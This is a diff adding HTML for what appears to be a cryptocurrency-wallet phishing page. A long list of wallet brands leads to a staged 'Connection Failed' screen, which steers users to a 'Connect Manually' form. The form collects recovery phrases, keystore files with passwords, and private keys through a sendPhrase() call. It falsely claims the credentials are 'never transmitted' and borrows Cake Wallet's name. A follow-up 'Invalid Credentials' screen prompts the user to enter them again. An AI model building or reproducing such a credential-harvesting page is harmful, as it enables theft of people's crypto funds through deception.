+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+          <div>
+            <div class="ow-name">Atomic Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+          <div>
+            <div class="ow-name">Trezor</div>
+            <div class="ow-chain">Hardware / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+          <div>
+            <div class="ow-name">TokenPocket</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/uniswap.png" alt="Uniswap" /></div>
+          <div>
+            <div class="ow-name">Uniswap Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+          <div>
+            <div class="ow-name">Crypto.com DeFi</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/keplr.png" alt="Keplr" /></div>
+          <div>
+            <div class="ow-name">Keplr</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/leapwallet.png" alt="Leap" /></div>
+          <div>
+            <div class="ow-name">Leap Wallet</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tangem.png" alt="Tangem" /></div>
+          <div>
+            <div class="ow-name">Tangem</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade" /></div>
+          <div>
+            <div class="ow-name">Jade</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/polkadot.png" alt="Polkadot.js" /></div>
+          <div>
+            <div class="ow-name">Polkadot.js</div>
+            <div class="ow-chain">Polkadot / Substrate</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/talisman.png" alt="Talisman" /></div>
+          <div>
+            <div class="ow-name">Talisman</div>
+            <div class="ow-chain">Polkadot / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/nami.png" alt="Nami" /></div>
+          <div>
+            <div class="ow-name">Nami</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/eternl.png" alt="Eternl" /></div>
+          <div>
+            <div class="ow-name">Eternl</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep" /></div>
+          <div>
+            <div class="ow-name">BitKeep</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/martian.png" alt="Martian" /></div>
+          <div>
+            <div class="ow-name">Martian</div>
+            <div class="ow-chain">Aptos / Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/suiet.png" alt="Suiet" /></div>
+          <div>
+            <div class="ow-name">Suiet</div>
+            <div class="ow-chain">Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi" /></div>
+          <div>
+            <div class="ow-name">Huobi</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/argent.png" alt="Argent" /></div>
+          <div>
+            <div class="ow-name">Argent</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly" /></div>
+          <div>
+            <div class="ow-name">Defly</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/midas.png" alt="Midas Wallet" /></div>
+          <div>
+            <div class="ow-name">Midas Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tongue.png" alt="Tongue Wallet" /></div>
+          <div>
+            <div class="ow-name">Tongue Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/celo.png" alt="Celo Wallet" /></div>
+          <div>
+            <div class="ow-name">Celo Wallet</div>
+            <div class="ow-chain">Celo</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bridge wallet.png" alt="Bridge Wallet" /></div>
+          <div>
+            <div class="ow-name">Bridge Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletio.png" alt="Wallet.io" /></div>
+          <div>
+            <div class="ow-name">Wallet.io</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/coinomi.png" alt="Coinomi Wallet" /></div>
+          <div>
+            <div class="ow-name">Coinomi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/dharma.png" alt="Dharma Wallet" /></div>
+          <div>
+            <div class="ow-name">Dharma Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/1inch.png" alt="1inch Wallet" /></div>
+          <div>
+            <div class="ow-name">1inch Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walleth.png" alt="walleth" /></div>
+          <div>
+            <div class="ow-name">walleth</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitpay.png" alt="BitPay Wallet" /></div>
+          <div>
+            <div class="ow-name">BitPay Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/infinito.png" alt="Infinito Wallet" /></div>
+          <div>
+            <div class="ow-name">Infinito Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly Wallet" /></div>
+          <div>
+            <div class="ow-name">Defly Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi Wallet" /></div>
+          <div>
+            <div class="ow-name">Huobi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep Wallet" /></div>
+          <div>
+            <div class="ow-name">BitKeep Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade Wallet" /></div>
+          <div>
+            <div class="ow-name">Jade Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="StepN Wallet" /></div>
+          <div>
+            <div class="ow-name">StepN Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+      </div>
+      <div class="ow-no-results" id="owNoResults">
+        <i class="ri-search-line"></i>
+        No wallets found for "<span id="owQuery" style="color:#6ea4ff;font-weight:600"></span>"
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Connecting -->
+    <div class="w-sub" id="wScreen2">
+      <div class="w-header">
+        <span class="w-title">Connecting</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-loading-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s2Name">Wallet</span>
+        </div>
+        <div class="w-spinner"></div>
+        <p class="w-status" id="s2Status">Initializing secure connection...</p>
+        <div class="w-progress-wrap">
+          <div class="w-progress-bar" id="s2Progress"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: Connection Failed -->
+    <div class="w-sub" id="wScreen3">
+      <div class="w-header">
+        <span class="w-title">Connection Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s3Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Unable to Connect</strong>
+          We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+          device. Try again or connect manually.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" id="retryBtn">
+            <i class="ri-refresh-line"></i> Retry Connection
+          </button>
+          <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: Manual Connect (custom) -->
+    <div class="w-sub" id="wScreen4">
+      <div class="w-header">
+        <span class="w-title">Connect Manually</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-manual-body">
+
+        <!-- wallet chip -->
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s4Name">Wallet</span>
+        </div>
+
+        <!-- type toggle: Phrase | Keystore JSON | Private Key -->
+        <div class="type-toggle">
+          <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+          <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+          <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+        </div>
+
+        <!-- Pane 1: Phrase -->
+        <div class="input-pane active" id="pane-phrase">
+          <textarea class="w-textarea phrase-area" id="phraseInput"
+            placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..." spellcheck="false"
+            autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- Pane 2: Keystore JSON -->
+        <div class="input-pane" id="pane-keystore">
+          <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+            spellcheck="false" autocomplete="off"></textarea>
+          <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+          <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+            <i class="ri-attachment-2"></i>
+            Attach Keystore File
+          </button>
+          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
+            onchange="handleKeystoreFile(this)" />
+          <p class="attach-file-name" id="attachFileName"></p>
+        </div>
+
+        <!-- Pane 3: Private Key -->
+        <div class="input-pane" id="pane-privatekey">
+          <textarea class="w-textarea privkey-area" id="privkeyInput"
+            placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false" autocomplete="off"
+            autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- encrypt note -->
+        <div class="w-encrypt-note">
+          <i class="ri-lock-2-line"></i>
+          <p>
+            <strong>End-to-end encrypted.</strong>
+            Your credentials are encrypted locally and never transmitted to any server.
+            Cake Wallet support will never ask for your seed phrase or private key.
+          </p>
+        </div>
+
+        <button class="w-btn w-btn-plum" onclick="sendPhrase()">
+          <i class="ri-wallet-3-line"></i> Connect Wallet
+        </button>
+
+      </div>
+    </div>
+
+    <!-- SCREEN 5: Manual Failed -->
+    <div class="w-sub" id="wScreen5">
+      <div class="w-header">
+        <span class="w-title">Verification Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s5Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Invalid Credentials</strong>
+          The information you entered could not be verified. Please double-check your phrase, keystore file,
+          or private key and try again.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
+            <i class="ri-refresh-line"></i> Try Again
+          </button>
+          <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script src="js/main.js"></script>
+  <script src="function.js"></script>
+
+</body>
+
+</html>
